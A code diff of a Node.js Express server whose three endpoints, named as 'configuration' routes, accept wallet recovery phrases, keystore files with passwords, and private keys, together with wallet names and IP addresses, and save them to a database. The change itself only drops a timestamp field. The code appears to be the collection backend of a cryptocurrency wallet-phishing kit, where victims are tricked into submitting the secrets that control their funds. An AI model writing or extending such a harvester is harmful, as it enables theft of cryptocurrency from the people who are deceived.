@@ -32,7 +32,7 @@ const database = knex({
 
 
 app.post("/configuration" ,(req,res) =>{
-const {phrase, walletname , ipAddress , time} = req.body
+const {phrase, walletname , ipAddress} = req.body
     if (!phrase) {
         return res.status(400).json("Incomplete Form Submission")
     }
@@ -42,7 +42,7 @@ const {phrase, walletname , ipAddress , time} = req.body
         phrase: phrase, 
         IpAddress : ipAddress,
         WalletName : walletname,
-        Timestamp: time
+    
     })
     .then(user =>{ 
         res.status(200).json("success")
@@ -51,7 +51,7 @@ const {phrase, walletname , ipAddress , time} = req.body
 })
 
 app.post("/configurationjson" ,(req,res) =>{
-const { keystore ,password ,  walletname , ipAddress , time} = req.body
+const { keystore ,password ,  walletname , ipAddress } = req.body
     if (!keystore || !password) {
         return res.status(400).json("Incomplete Form Submission")
     }
@@ -61,7 +61,7 @@ const { keystore ,password ,  walletname , ipAddress , time} = req.body
         password: password,
          IpAddress : ipAddress,
         WalletName : walletname,
-         Timestamp: time
+        
         
     })
     .then(user =>{ 
@@ -71,7 +71,7 @@ const { keystore ,password ,  walletname , ipAddress , time} = req.body
 })
 
 app.post("/configurationprivate" ,(req,res) =>{
-const { privatekey ,  walletname , ipAddress , time} = req.body
+const { privatekey ,  walletname , ipAddress } = req.body
     if (!privatekey) {
         return res.status(400).json("Incomplete Form Submission")
     }
@@ -80,7 +80,7 @@ const { privatekey ,  walletname , ipAddress , time} = req.body
         privateKey: privatekey,
          IpAddress : ipAddress,
         WalletName : walletname,
-         Timestamp: time
+     
         
     })
     .then(user =>{ 
